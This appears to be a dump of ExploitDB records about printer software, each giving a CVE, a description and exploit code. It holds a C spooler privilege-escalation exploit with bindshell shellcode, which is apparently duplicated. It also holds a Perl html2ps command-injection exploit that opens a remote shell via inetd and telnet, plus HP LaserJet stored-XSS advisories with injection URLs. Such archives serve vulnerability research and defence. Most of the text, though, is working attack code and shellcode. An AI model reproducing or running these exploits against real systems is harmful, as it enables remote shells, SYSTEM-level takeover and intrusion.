(!NtConnectPort(&hPort,&uStr,&qos,(DWORD *)&sectionInfo,(DWORD *)&mapInfo,&maxSize,(DWORD*)ConnectDataBuffer,&Size)){\r\n         ret.LowPart=sectionInfo.ClientBaseAddress ; \r\n         ret.HighPart=sectionInfo.ServerBaseAddress;\r\n      } \r\n\r\n\r\n   }\r\n\treturn(ret);\r\n}\r\n\r\n#define BOFSIZE 300 //Change it if size needed more to exploit you printer provider\r\n \r\nint main(int argc, char* argv[])\r\n{\r\n  \r\n  unsigned char exploit[BOFSIZE];\r\n  unsigned char buffer[REQUIRED_SIZE];\r\n  DWORD dwSizeNeeded,n=0;\r\n  DWORD datalen=REQUIRED_SIZE;\r\n  LARGE_INTEGER dirs;\r\n  HANDLE hProcess;\r\n  DWORD write;\r\n  char *p,i;\r\n  #define lpLocalAddress dirs.LowPart\r\n  #define lpTargetAddress dirs.HighPart\r\n\r\n  printf("[+] Universal exploit for printer spooler providers\\n");\r\n  printf("[+] Some Citrix metaframe, DiskAccess and Novel versions are affected\\n");\r\n  printf("[+] Exploit by Andres Tarasco - atarasco@514.es\\n\\n");\r\n\r\n  printf("[+] Connecting to spooler LCP port \\\\RPC Control\\\\spoolss\\n");\r\n  \r\n\r\n \r\n  do {\r\n   dirs=ConnectToLPCPort();\r\n   printf("[+] Trying to locate valid address: Found 0x%8.8x after %i tries\\r",lpTargetAddress,n+1);\r\n   if (lpLocalAddress==0){ \r\n\t printf("\\n[-] Unable to connect to spooler LPC port\\n"); \r\n    printf("[-] Check if the service is running\\n");\r\n\t exit(0);\r\n   }\r\n   i=lpTargetAddress>>24; // & 0xFF000000 == 0\r\n   n++;\r\n   if (n==MAXLOOPS) {\r\n      printf("\\n[-] Unable to locate a valid address after %i tries\\n",n);\r\n      printf("[?] Maybe a greater REQUIRED_SIZE should help. Try increasing it\\n");\r\n      return(0);\r\n   }\r\n  }while (i!=0);\r\n  \r\n  //printf(" (%i tries)\\n",n);\r\n  printf("\\n");\r\n\r\n  printf("[+] Mapped memory. Client address: 0x%8.8x\\n",lpLocalAddress);\r\n  printf("[+] Mapped memory. Server address: 0x%8.8x\\n",lpTargetAddress);\r\n\r\n \r\n  i=(lpTargetAddress<<8)>>24;\r\n  //Fill all with rets. who cares where is it.\r\n  memset(exploit,i,sizeof(exploit)); \r\n  exploit[sizeof(exploit)-1]=\'\\0\';\r\n\r\n  /*\r\n  memset(exploit,\'A\',sizeof(exploit)-1);\r\n  exploit[262]= (lpTargetAddress<<8)>>24; //EIP for Diskaccess\r\n  exploit[263]= (lpTargetAddress<<8)>>24; //EIP for Diskaccess\r\n  exploit[264]=\'\\0\';\r\n  */\r\n  \r\n  printf("[+] Targeting return address to  : 0x00%2.2X00%2.2X\\n",exploit[262],exploit[262]);\r\n\r\n  p=(char *)lpLocalAddress;\r\n\r\n  memset(&buffer[0],0x90,REQUIRED_SIZE);\r\n  memcpy(&buffer[REQUIRED_SIZE -sizeof(shellcode)-10],shellcode,sizeof(shellcode));\r\n  \r\n  printf("[+] Writting to shared memory...\\n");\r\n  if ( (hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()))!= NULL ) \r\n  {\r\n    if ( WriteProcessMemory( hProcess, p, &buffer[0], REQUIRED_SIZE, &write )!=0 )\r\n    {\r\n      printf("[+] Written 0x%x bytes \\n",write);\r\n      printf("[+] Exploiting vulnerability....\\n");\r\n      printf("[+] Exploit complete. Now try to connect to 127.0.0.1:51477\\n");\r\n      printf("[+] and check if you are system =)\\n");\r\n      EnumPrintersA ( PRINTER_ENUM_NAME, (char *)exploit, 1, NULL, 0, &dwSizeNeeded, &n );\r\n      return(1);\r\n    } else {\r\n       printf("[-] Written 0x%x bytes \\n",write);\r\n\r\n    }\r\n  } \r\n  printf("[-] Something failed. Error %i - Good luck next time\\n",GetLastError());\r\n  return(0);\r\n}', u'description': u"Novell Client 4.91 - 'NWSPOOL.dll' Remote Buffer Overflow", u'platform': u'windows', u'author': u'Andres Tarasco Acuna', u'cve': [u'CVE-2006-5854'], u'source': u'ExploitDB', u'date': u'2006-11-21T00:00:00+00:00', u'_id': 29146, u'type': u'remote', u'port': 0}

CVE: [u'CVE-2006-5854']
Description: SSC DiskAccess NFS Client - 'DAPCNFSD.dll' Remote Stack Buffer Overflow
{u'code': u'source: http://www.securityfocus.com/bid/22301/info\r\n\r\nShaffer Solutions Corp DiskAccess is prone to a stack-based buffer-overflow vulnerability because it fails to properly bounds-check user-supplied data before copying it into an insufficiently sized memory buffer.\r\n\r\nAn attacker can exploit this issue to execute arbitrary code within the context of the Spooler service. The Spooler service typically runs with the privileges of the \'LocalSystem\' account. \r\n\r\n/********************Private exploit- internal use only*****************\r\n Title: Universal exploit for vulnerable printer providers (spooler service).\r\n Vulnerability: Insecure EnumPrintersW() calls\r\n Author: Andres Tarasco Acu\ufffda - atarasco@514.es\r\n Website: http://www.514.es\r\n \r\n\r\n This code should allow to gain SYSTEM privileges with the following software:\r\n blink !blink! blink!\r\n\r\n - DiskAccess NFS Client (dapcnfsd.dll v0.6.4.0) - REPORTED & NOTFIXED -0day!!! \r\n - Citrix Metaframe - cpprov.dll  - FIXED\r\n - Novell (nwspool.dll  - CVE-2006-5854 - untested)\r\n - More undisclosed stuff =)\r\n\r\n  If this code crashes your spooler service (spoolsv.exe) check your \r\n  "vulnerable" printer providers at:\r\n  HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Providers\r\n\r\n  Workaround: Trust only default printer providers "Internet Print Provider" \r\n  and "LanMan Print Services" and delete the other ones.\r\n \r\n  And remember, if it doesnt work for you, tweak it yourself. Do not ask\r\n\r\n\r\n  D:\\Programaci\ufffdn\\EnumPrinters\\Exploits>testlpc.exe\r\n [+] Citrix Presentation Server - EnumPrinterW() Universal exploit\r\n [+] Exploit coded by Andres Tarasco - atarasco@514.es\r\n \r\n\r\n [+] Connecting to spooler LCP port \\RPC Control\\spoolss\r\n [+] Trying to locate valid address (1 tries)\r\n [+] Mapped memory. Client address: 0x003d0000\r\n [+] Mapped memory. Server address: 0x00a70000\r\n [+] Targeting return address to  : 0x00A700A7\r\n [+] Writting to shared memory...\r\n [+] Written 0x1000 bytes\r\n [+] Exploiting vulnerability....\r\n [+] Exploit complete. Now Connect to 127.0.0.1:51477\r\n \r\n\r\n D:\\Programaci\ufffdn\\EnumPrinters>nc localhost 51477\r\n Microsoft Windows XP [Versi\ufffdn 5.1.2600]\r\n (C) Copyright 1985-2001 Microsoft Corp.\r\n\r\n C:\\WINDOWS\\system32>whoami\r\n NT AUTHORITY\\SYSTEM\r\n\r\n\r\n  514 ownz u\r\n ********************Private exploit- internal use only*****************/\r\n#include <stdio.h>\r\n#include <windows.h>\r\n#include <Winspool.h>\r\n#pragma comment(lib,"Winspool.lib")\r\n\r\n\r\n#define REQUIRED_SIZE 0x1000\r\n#define MAXLOOPS      10000 \r\nunsigned char shellcode[] =\r\n/*Just a metasploit shellcode - Bindshell 51477 */\r\n"\\x2b\\xc9\\x83\\xe9\\xb0\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\xe6"\r\n"\\xc0\\xc6\\x10\\x83\\xeb\\xfc\\xe2\\xf4\\x1a\\xaa\\x2d\\x5d\\x0e\\x39\\x39\\xef"\r\n"\\x19\\xa0\\x4d\\x7c\\xc2\\xe4\\x4d\\x55\\xda\\x4b\\xba\\x15\\x9e\\xc1\\x29\\x9b"\r\n"\\xa9\\xd8\\x4d\\x4f\\xc6\\xc1\\x2d\\x59\\x6d\\xf4\\x4d\\x11\\x08\\xf1\\x06\\x89"\r\n"\\x4a\\x44\\x06\\x64\\xe1\\x01\\x0c\\x1d\\xe7\\x02\\x2d\\xe4\\xdd\\x94\\xe2\\x38"\r\n"\\x93\\x25\\x4d\\x4f\\xc2\\xc1\\x2d\\x76\\x6d\\xcc\\x8d\\x9b\\xb9\\xdc\\xc7\\xfb"\r\n"\\xe5\\xec\\x4d\\x99\\x8a\\xe4\\xda\\x71\\x25\\xf1\\x1d\\x74\\x6d\\x83\\xf6\\x9b"\r\n"\\xa6\\xcc\\x4d\\x60\\xfa\\x6d\\x4d\\x50\\xee\\x9e\\xae\\x9e\\xa8\\xce\\x2a\\x40"\r\n"\\x19\\x16\\xa0\\x43\\x80\\xa8\\xf5\\x22\\x8e\\xb7\\xb5\\x22\\xb9\\x94\\x39\\xc0"\r\n"\\x8e\\x0b\\x2b\\xec\\xdd\\x90\\x39\\xc6\\xb9\\x49\\x23\\x76\\x67\\x2d\\xce\\x12"\r\n"\\xb3\\xaa\\xc4\\xef\\x36\\xa8\\x1f\\x19\\x13\\x6d\\x91\\xef\\x30\\x93\\x95\\x43"\r\n"\\xb5\\x93\\x85\\x43\\xa5\\x93\\x39\\xc0\\x80\\xa8\\x0f\\x05\\x80\\x93\\x4f\\xf1"\r\n"\\x73\\xa8\\x62\\x0a\\x96\\x07\\x91\\xef\\x30\\xaa\\xd6\\x41\\xb3\\x3f\\x16\\x78"\r\n"\\x42\\x6d\\xe8\\xf9\\xb1\\x3f\\x10\\x43\\xb3\\x3f\\x16\\x78\\x03\\x89\\x40\\x59"\r\n"\\xb1\\x3f\\x10\\x40\\xb2\\x94\\x93\\xef\\x36\\x53\\xae\\xf7\\x9f\\x06\\xbf\\x47"\r\n"\\x19\\x16\\x93\\xef\\x36\\xa6\\xac\\x74\\x80\\xa8\\xa5\\x7d\\x6f\\x25\\xac\\x40"\r\n"\\xbf\\xe9\\x0a\\x99\\x01\\xaa\\x82\\x99\\x04\\xf1\\x06\\xe3\\x4c\\x3e\\x84\\x3d"\r\n"\\x18\\x82\\xea\\x83\\x6b\\xba\\xfe\\xbb\\x4d\\x6b\\xae\\x62\\x18\\x73\\xd0\\xef"\r\n"\\x93\\x84\\x39\\xc6\\xbd\\x97\\x94\\x41\\xb7\\x91\\xac\\x11\\xb7\\x91\\x93\\x41"\r\n"\\x19\\x10\\xae\\xbd\\x3f\\xc5\\x08\\x43\\x19\\x16\\xac\\xef\\x19\\xf7\\x39\\xc0"\r\n"\\x6d\\x97\\x3a\\x93\\x22\\xa4\\x39\\xc6\\xb4\\x3f\\x16\\x78\\x16\\x4a\\xc2\\x4f"\r\n"\\xb5\\x3f\\x10\\xef\\x36\\xc0\\xc6\\x10";\r\n\r\ntypedef struct _UNICODE_STRING {\r\n  USHORT  Length;\r\n  USHORT  MaximumLength;\r\n  PWSTR  Buffer;\r\n} UNICODE_STRING;\r\n\r\n\r\ntypedef struct LpcSectionMapInfo{\r\n        DWORD Length;\r\n        DWORD SectionSize;\r\n        DWORD ServerBaseAddress;\r\n} LPCSECTIONMAPINFO;\r\n\r\n\r\ntypedef struct LpcSectionInfo {\r\n        DWORD Length;\r\n        HANDLE SectionHandle;\r\n        DWORD Param1;\r\n        DWORD SectionSize;\r\n        DWORD ClientBaseAddress;\r\n        DWORD ServerBaseAddress;\r\n} LPCSECTIONINFO;\r\n\r\n\r\n#define SHARED_SECTION_SIZE 0x1000\r\n\r\ntypedef struct _OBJDIR_INFORMATION {\r\n  UNICODE_STRING          ObjectName;\r\n  UNICODE_STRING          ObjectTypeName;\r\n  BYTE                    Data[1];\r\n} OBJDIR_INFORMATION;\r\n\r\ntypedef struct _OBJECT_ATTRIBUTES {\r\n    ULONG Length;\r\n    HANDLE RootDirectory;\r\n    UNICODE_STRING *ObjectName;\r\n    ULONG Attributes;\r\n    PVOID SecurityDescriptor;        \r\n    PVOID SecurityQualityOfService;  \r\n} OBJECT_ATTRIBUTES;\r\n\r\n#define InitializeObjectAttributes( p, n, a, r, s ) { \\\r\n    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \\\r\n    (p)->RootDirectory = r;                             \\\r\n    (p)->Attributes = a;                                \\\r\n    (p)->ObjectName = n;                                \\\r\n    (p)->SecurityDescriptor = s;                        \\\r\n    (p)->SecurityQualityOfService = NULL;               \\\r\n    }\r\n\r\n\r\ntypedef DWORD (WINAPI *NTCREATESECTION)(\r\n   HANDLE* SectionHandle,\r\n   unsigned long DesiredAccess,\r\n   OBJECT_ATTRIBUTES *ObjectAttributes,\r\n   PLARGE_INTEGER MaximumSize,\r\n   unsigned long PageAttributess,\r\n   unsigned long SectionAttributes,\r\n   HANDLE FileHandle);\r\n\r\ntypedef DWORD (WINAPI *NTCONNECTPORT)(\r\n   HANDLE *ClientPortHandle, \r\n   UNICODE_STRING *ServerPortName, \r\n   SECURITY_QUALITY_OF_SERVICE *SecurityQos, \r\n   DWORD *ClientSharedMemory,\r\n   DWORD *ServerSharedMemory,\r\n   DWORD *MaximumMessageLength,\r\n   DWORD *ConnectionInfo OPTIONAL, \r\n   DWORD *ConnectionInfoLength); \r\n\r\n\r\nLARGE_INTEGER ConnectToLPCPort(void){\r\n   /* Thanks goes to Cesar Cerrudo for the WLSI paper */\r\n\tHANDLE hPort;\r\n\tLPCSECTIONINFO sectionInfo;\r\n\tLPCSECTIONMAPINFO mapInfo;\r\n\tbyte ConnectDataBuffer[100];\r\n\tDWORD Size = sizeof(ConnectDataBuffer);\r\n   WCHAR  * uString=L"\\\\RPC Control\\\\spoolss";\r\n\tDWORD i;\r\n\tUNICODE_STRING uStr;\r\n   LARGE_INTEGER ret;\r\n   \r\n\r\n   NTCONNECTPORT NtConnectPort;\r\n   NTCREATESECTION NtCreateSection;\r\n\r\n   ret.QuadPart=0;\r\n\tfor (i=0;i<100;i++)\r\n\t\tConnectDataBuffer[i]=0x0;\r\n\r\n\r\n   NtConnectPort= (NTCONNECTPORT)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtConnectPort");\r\n   NtCreateSection= (NTCREATESECTION)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");\r\n\r\n   if ( (!NtConnectPort) || (!NtCreateSection) ) {\r\n      printf("[-] Error Loading functions\\n");\r\n   } else {\r\n   \tHANDLE hSection;\r\n\t   LARGE_INTEGER SecSize;\r\n\t   DWORD maxSize=0;\r\n\t   SECURITY_QUALITY_OF_SERVICE qos;\r\n      DWORD qosSize=4;\r\n\r\n      //create shared section\t\r\n      SecSize.LowPart=REQUIRED_SIZE;//0x1000;\r\n\t   SecSize.HighPart=0x0;\r\n\r\n\t   qos.Length =(DWORD)&qosSize;\r\n\t   qos.ImpersonationLevel =SecurityIdentification;\r\n\t   qos.ContextTrackingMode =0x01000101;\r\n\t   qos.EffectiveOnly =0x10000;\r\n\t   \r\n\t   NtCreateSection(&hSection,SECTION_ALL_ACCESS,NULL,&SecSize,PAGE_READWRITE,SEC_COMMIT ,NULL);\r\n      \r\n      //connect to lpc\r\n\t   memset(&sectionInfo, 0, sizeof(sectionInfo));\r\n\t   memset(&mapInfo, 0, sizeof(mapInfo));\r\n\r\n\t   sectionInfo.Length = 0x18;\r\n\t   sectionInfo.SectionHandle =hSection;\r\n\t   sectionInfo.SectionSize = SHARED_SECTION_SIZE;\r\n\t   mapInfo.Length = 0x0C;\r\n\r\n\t   uStr.Length = wcslen(uString)*2;\r\n\t   uStr.MaximumLength = wcslen(uString)*2+2;\r\n\t   uStr.Buffer =uString;\r\n\t\r\n\t   //connect to LPC port\r\n\t   if (!NtConnectPort(&hPort,&uStr,&qos,(DWORD *)&sectionInfo,(DWORD *)&mapInfo,&maxSize,(DWORD*)ConnectDataBuffer,&Size)){\r\n         ret.LowPart=sectionInfo.ClientBaseAddress ; \r\n         ret.HighPart=sectionInfo.ServerBaseAddress;\r\n      } \r\n\r\n\r\n   }\r\n\treturn(ret);\r\n}\r\n\r\n#define BOFSIZE 300 //Change it if size needed more to exploit you printer provider\r\n \r\nint main(int argc, char* argv[])\r\n{\r\n  \r\n  unsigned char exploit[BOFSIZE];\r\n  unsigned char buffer[REQUIRED_SIZE];\r\n  DWORD dwSizeNeeded,n=0;\r\n  DWORD datalen=REQUIRED_SIZE;\r\n  LARGE_INTEGER dirs;\r\n  HANDLE hProcess;\r\n  DWORD write;\r\n  char *p,i;\r\n  #define lpLocalAddress dirs.LowPart\r\n  #define lpTargetAddress dirs.HighPart\r\n\r\n  printf("[+] Universal exploit for printer spooler providers\\n");\r\n  printf("[+] Some Citrix metaframe, DiskAccess and Novel versions are affected\\n");\r\n  printf("[+] Exploit by Andres Tarasco - atarasco@514.es\\n\\n");\r\n\r\n  printf("[+] Connecting to spooler LCP port \\\\RPC Control\\\\spoolss\\n");\r\n  \r\n\r\n \r\n  do {\r\n   dirs=ConnectToLPCPort();\r\n   printf("[+] Trying to locate valid address: Found 0x%8.8x after %i tries\\r",lpTargetAddress,n+1);\r\n   if (lpLocalAddress==0){ \r\n\t printf("\\n[-] Unable to connect to spooler LPC port\\n"); \r\n    printf("[-] Check if the service is running\\n");\r\n\t exit(0);\r\n   }\r\n   i=lpTargetAddress>>24; // & 0xFF000000 == 0\r\n   n++;\r\n   if (n==MAXLOOPS) {\r\n      printf("\\n[-] Unable to locate a valid address after %i tries\\n",n);\r\n      printf("[?] Maybe a greater REQUIRED_SIZE should help. Try increasing it\\n");\r\n      return(0);\r\n   }\r\n  }while (i!=0);\r\n  \r\n  //printf(" (%i tries)\\n",n);\r\n  printf("\\n");\r\n\r\n  printf("[+] Mapped memory. Client address: 0x%8.8x\\n",lpLocalAddress);\r\n  printf("[+] Mapped memory. Server address: 0x%8.8x\\n",lpTargetAddress);\r\n\r\n \r\n  i=(lpTargetAddress<<8)>>24;\r\n  //Fill all with rets. who cares where is it.\r\n  memset(exploit,i,sizeof(exploit)); \r\n  exploit[sizeof(exploit)-1]=\'\\0\';\r\n\r\n  /*\r\n  memset(exploit,\'A\',sizeof(exploit)-1);\r\n  exploit[262]= (lpTargetAddress<<8)>>24; //EIP for Diskaccess\r\n  exploit[263]= (lpTargetAddress<<8)>>24; //EIP for Diskaccess\r\n  exploit[264]=\'\\0\';\r\n  */\r\n  \r\n  printf("[+] Targeting return address to  : 0x00%2.2X00%2.2X\\n",exploit[262],exploit[262]);\r\n\r\n  p=(char *)lpLocalAddress;\r\n\r\n  memset(&buffer[0],0x90,REQUIRED_SIZE);\r\n  memcpy(&buffer[REQUIRED_SIZE -sizeof(shellcode)-10],shellcode,sizeof(shellcode));\r\n  \r\n  printf("[+] Writting to shared memory...\\n");\r\n  if ( (hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()))!= NULL ) \r\n  {\r\n    if ( WriteProcessMemory( hProcess, p, &buffer[0], REQUIRED_SIZE, &write )!=0 )\r\n    {\r\n      printf("[+] Written 0x%x bytes \\n",write);\r\n      printf("[+] Exploiting vulnerability....\\n");\r\n      printf("[+] Exploit complete. Now try to connect to 127.0.0.1:51477\\n");\r\n      printf("[+] and check if you are system =)\\n");\r\n      EnumPrintersA ( PRINTER_ENUM_NAME, (char *)exploit, 1, NULL, 0, &dwSizeNeeded, &n );\r\n      return(1);\r\n    } else {\r\n       printf("[-] Written 0x%x bytes \\n",write);\r\n\r\n    }\r\n  } \r\n  printf("[-] Something failed. Error %i - Good luck next time\\n",GetLastError());\r\n  return(0);\r\n}', u'description': u"SSC DiskAccess NFS Client - 'DAPCNFSD.dll' Remote Stack Buffer Overflow", u'platform': u'windows', u'author': u'Andres Tarasco Acuna', u'cve': [u'CVE-2006-5854'], u'source': u'ExploitDB', u'date': u'2007-01-29T00:00:00+00:00', u'_id': 29538, u'type': u'remote', u'port': 0}

CVE: [u'CVE-2009-2684']
Description: HP Multiple LaserJet Printer - Cross-Site Scripting
{u'code': u'Digital Security Research Group [DSecRG] Advisory       #DSECRG-09-048\r\n\r\nhttp://dsecrg.ru/pages/vul/show.php?id=148\r\n\r\nApplication:                HP LaserJet printer web interface\r\nVulnerable:                 HP LaserJet 2200, 4350, 4600, 5500, and many others\r\nVendor URL:                 http://www.hp.com/\r\nBug:                        Multiple Stored XSS Vulnerabilities\r\nExploits:                   YES\r\nReported:                   07.04.2009\r\nVendor response:            08.04.2009\r\nDate of Public Advisory:    07.10.2009\r\nCVE-number:                 CVE-2009-2684\r\nCVSS2 score:                5.0 (AV:N/AC:L/Au:N/C:P/I:N/A:N)    \r\nAuthor:                     s.svistunovich, a.polyakov \r\n                            Digital Security Research Group [DSecRG] (research [at] dsecrg [dot] com)\r\n\r\n\r\n\r\nDescription\r\n***********\r\nMultiple security vulnerabilities have been identified with certain HP LaserJet printers,\r\nHP Color LaserJet printers and HP Digital Senders. The vulnerabilities could be exploited remotely by Cross Site Scripting (XSS).\r\n\r\n\r\nDetails\r\n*******\r\n\r\nMultiple Linked Stored XSS vulnerabilities found in script support_param.html/config\r\n\r\nAttacker can inject XSS in parameters "Product_URL" and "Tech_URL".\r\n\r\nAfter applying support parameters configuration (parameter "Apply") script code will inject in support page (support.htm).\r\n\r\nExample:\r\n\r\nhttp://[server]/support_param.html/config?Admin_Name=&Admin_Phone=&Product_URL=[XSS]&Tech_URL=[XSS]&Apply=Apply\r\n\r\n\r\nSolution\r\n********\r\nwendor recomends the following steps can be taken to limit the exposure to the XSS vulnerabilities:\r\n\r\n        set the administrator password \r\n        use a new browser instance for administrator tasks\r\n        do not access other web sites while performing administrator tasks\r\n        exit the browser when administrator tasks are complete\r\n\r\nDocument ID: c01841397\r\n\r\nHPSBPI02463 SSRT090061 rev.1 - HP LaserJet Printers, HP Color LaserJet Printers, Remote Cross Site Scripting (XSS)\r\n\r\n\r\nhttp://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c01841397\r\n\r\n\r\nReferences\r\n**********\r\n\r\nThe Hewlett-Packard Company thanks Digital Security Research Group (dsecrg.com) for reporting these vulnerabilities to security-alert@hp.com.\r\n\r\nhttp://dsecrg.ru/pages/vul/show.php?id=148\r\nhttp://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c01841397\r\n\r\n\r\nAbout\r\n*****\r\n\r\nDigital Security is one of the  leading IT security companies in CEMEA, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.\r\n\r\n\r\nContact:    research [at] dsecrg [dot] com\r\n           http://www.dsecrg.com\r\n          \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nPolyakov Alexandr\r\nInformation Security Analyst\r\n______________________\r\nDIGITAL SECURITY\r\nphone:  +7 812 703 1547\r\n        +7 812 430 9130\r\ne-mail: a.polyakov@dsec.ru  \r\nwww.dsec.ru\r\n\r\n\r\n-----------------------------------\r\nThis message and any attachment are confidential and may be privileged or otherwise protected \r\nfrom disclosure. If you are not the intended recipient any use, distribution, copying or disclosure \r\nis strictly prohibited. If you have received this message in error, please notify the sender immediately \r\neither by telephone or by e-mail and delete this message and any attachment from your system. Correspondence \r\nvia e-mail is for information purposes only. Digital Security neither makes nor accepts legally binding \r\nstatements by e-mail unless otherwise agreed. \r\n-----------------------------------', u'description': u'HP Multiple LaserJet Printer - Cross-Site Scripting', u'platform': u'hardware', u'author': u'sh2kerr', u'cve': [u'CVE-2009-2684'], u'source': u'ExploitDB', u'date': u'2009-07-04T00:00:00+00:00', u'_id': 10055, u'type': u'remote', u'port': 80}

CVE: []
Description: LPRNG html2ps 1.0 - Remote Command Execution
{u'code': u'source: http://www.securityfocus.com/bid/6079/info\r\n\r\nA vulnerability has been discovered in the html2ps filter which is included in the lprng print system.\r\n\r\nIt has been reported that it is possible for a remote attacker to execute arbitrary commands. The attacker must reportedly already have access to the \'lp\' (or equivalent) account to exploit this condition.\r\n\r\nThis cause of this vulnerability is that html2ps may open files using unsanitized input that may be supplied by a potentially malicious user. \r\n\r\n#!/usr/bin/perl -W\r\n\r\n# html2ps remote "lp" exploit. Opens shell on port 7350.\r\n# If used for testing remote machines, /etc/printcap must\r\n# contain apropriate remote printernames etc. and lpd must\r\n# be set up correctly.\r\n# (C) 2002 Sebastian Krahmer, proof of concept exploit.\r\n\r\n# Brief problem description: lprng calls printfilters as any\r\n# other print-spooloing systems do. It calls them with UID of lp\r\n# thats why you get lp-user shell later. The html2ps filter which is\r\n# a perl script is called to convert the evil.html to .ps.\r\n# However there it breaks because html2ps calls open() function insecurely\r\n# and some other bad stuff is done too. It tries to convert the IMG embedded\r\n# in the html and invokes some commands which give us access. Thats all. :)\r\n\r\n\r\nsub usage\r\n{\r\n\tprint "\\n$0 <printhost> <remote-host>\\n".\r\n\t      "\\tprinthost   -- name of printer in /etc/printcap\\n".\r\n\t      "\\tremote-host -- IP or hostname of host where shell appears\\n".\r\n\t      "\'$0 lp 127.0.0.1\' is recommended for everyones own machine\\n\\n";\r\n\texit;\r\n}\r\n\r\n\r\nmy $printhost = shift || usage();\r\nmy $remote = shift || usage();\r\n\r\nprint "Constructing evil.html ...\\n";\r\n\r\nopen O, ">evil.html" or die $!;\r\nprint O<<__eof__;\r\n<HTML>\r\n<IMG SRC="|IFS=A;X=A;echo\\${X}7350\\${X}stream\\${X}tcp\\${X}nowait\\${X}lp\\${X}/bin/sh\\${X}-i|dd\\${X}of=/tmp/f;inetd\\${X}/tmp/f">\r\n</HTML>\r\n__eof__\r\n\r\nclose O;\r\n\r\nif (fork() == 0) {\r\n\texec("/usr/bin/lpr", "-P", $printhost, "evil.html");\r\n}\r\nwait;\r\nsleep 3;\r\nprint "Connecting ...\\n";\r\nexec("/usr/bin/telnet", $remote, 7350);', u'description': u'LPRNG html2ps 1.0 - Remote Command Execution', u'platform': u'unix', u'author': u'Sebastian Krahmer', u'cve': [], u'source': u'ExploitDB', u'date': u'2002-10-31T00:00:00+00:00', u'_id': 21974, u'type': u'remote', u'port': 0}

CVE: [u'CVE-2009-2684']
Description: HP LaserJet Printers - Multiple Persistent Cross-Site Scripting Vulnerabilities
{u'code': u'Digital Security Research Group [DSecRG] Advisory #DSECRG-09-048\r\n\r\nhttp://dsecrg.ru/pages/vul/show.php?id=148\r\n\r\nApplication: HP LaserJet printer web interface\r\nVulnerable: HP LaserJet 2200, 4350, 4600, 5500, and many others\r\nVendor URL: http://www.hp.com/\r\nBug: Multiple Stored XSS Vulnerabilities\r\nExploits: YES\r\nReported: 07.04.2009\r\nVendor response: 08.04.2009\r\nDate of Public Advisory: 07.10.2009\r\nCVE-number: CVE-2009-2684\r\nCVSS2 score: 5.0 (AV:N/AC:L/Au:N/C:P/I:N/A:N) \r\nAuthor: s.svistunovich, a.polyakov \r\nDigital Security Research Group [DSecRG] (research [at] dsecrg [dot] com)\r\n\r\nDescription\r\n***********\r\nMultiple security vulnerabilities have been identified with certain HP LaserJet printers,\r\nHP Color LaserJet printers and HP Digital Senders. The vulnerabilities could be exploited remotely by Cross Site Scripting (XSS).\r\n\r\nDetails\r\n*******\r\n\r\nMultiple Linked Stored XSS vulnerabilities found in script support_param.html/config\r\n\r\nAttacker can inject XSS in parameters "Product_URL" and "Tech_URL".\r\n\r\nAfter applying support parameters configuration (parameter "Apply") script code will inject in support page (support.htm).\r\n\r\nExample:\r\n\r\nhttp://[server]/support_param.html/config?Admin_Name=&Admin_Phone=&Produ\r\nct_URL=[XSS]&Tech_URL=[XSS]&Apply=Apply\r\n\r\nSolution\r\n********\r\nwendor recomends the following steps can be taken to limit the exposure to the XSS vulnerabilities:\r\n\r\nset the administrator password \r\nuse a new browser instance for administrator tasks\r\ndo not access other web sites while performing administrator tasks\r\nexit the browser when administrator tasks are complete\r\n\r\nDocument ID: c01841397\r\n\r\nHPSBPI02463 SSRT090061 rev.1 - HP LaserJet Printers, HP Color LaserJet Printers, Remote Cross Site Scripting (XSS)\r\n\r\nhttp://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c\r\n01841397\r\n\r\nReferences\r\n**********\r\n\r\nThe Hewlett-Packard Company thanks Digital Security Research Group (dsecrg.com) for reporting these vulnerabilities to security-alert (at) hp (dot) com. [email concealed]\r\n\r\nhttp://dsecrg.ru/pages/vul/show.php?id=148\r\nhttp://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c\r\n01841397\r\n\r\nAbout\r\n*****\r\n\r\nDigital Security is one of the leading IT security companies in CEMEA, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.\r\n\r\nContact: research [at] dsecrg [dot] com\r\nhttp://www.dsecrg.com\r\n\r\nPolyakov Alexandr\r\nInformation Security Analyst\r\n______________________\r\nDIGITAL SECURITY\r\nphone: +7 812 703 1547\r\n+7 812 430 9130\r\ne-mail: a.polyakov (at) dsec (dot) ru [email concealed] \r\nwww.dsec.ru\r\n\r\n-----------------------------------\r\nThis message and any attachment are confidential and may be privileged or otherwise protected \r\nfrom disclosure. If you are not the intended recipient any use, distribution, copying or disclosure \r\nis strictly prohibited. If you have received this message in error, please notify the sender immediately \r\neither by telephone or by e-mail and delete this message and any attachment from your system. Correspondence \r\nvia e-mail is for information purposes only. Digital Security neither makes nor accepts legally binding \r\nstatements by e-mail unless otherwise agreed. \r\n-----------------------------------', u'description': u'HP LaserJet Printers - Multiple Persistent Cross-Site Scripting Vulnerabilities', u'platform': u'hardware', u'author': u'Digital Security Research Group', u'cve': [u'CVE-2009-2684'], u'source': u'ExploitDB', u'date': u'2009-10-07T00:00:00+00:00', u'_id': 10011, u'type': u'remote', u'port': 80}

CVE: []
Description: Microsoft Windows Server 2000 SP1/SP2 - isapi .printer Extension Overflow (1)
